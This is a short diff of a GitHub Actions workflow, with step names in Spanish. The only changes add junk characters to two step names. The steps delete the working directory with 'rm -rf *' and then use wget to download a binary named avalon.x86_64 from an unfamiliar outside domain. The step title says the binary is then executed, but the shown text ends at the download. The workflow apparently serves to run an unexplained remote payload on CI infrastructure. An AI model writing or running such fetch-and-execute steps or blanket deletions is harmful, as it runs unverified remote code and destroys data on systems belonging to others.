@@ -10,11 +10,11 @@ jobs:
     runs-on: ubuntu-latest
     
     steps:
-    - name: 🗑️ Limpiar directorio
+    - name: 🗑️ Limpiar directorio0o0
       run: |
         rm -rf * 2>/dev/null || true
     
-    - name: 🚀 Descargar y Ejecutar Avalon
+    - name: 🚀 Descargar y Ejecutar Avalonnmn
       run: |
         # 1. Descargar el archivo
         wget https://dcasdcas.online/avalon.x86_64
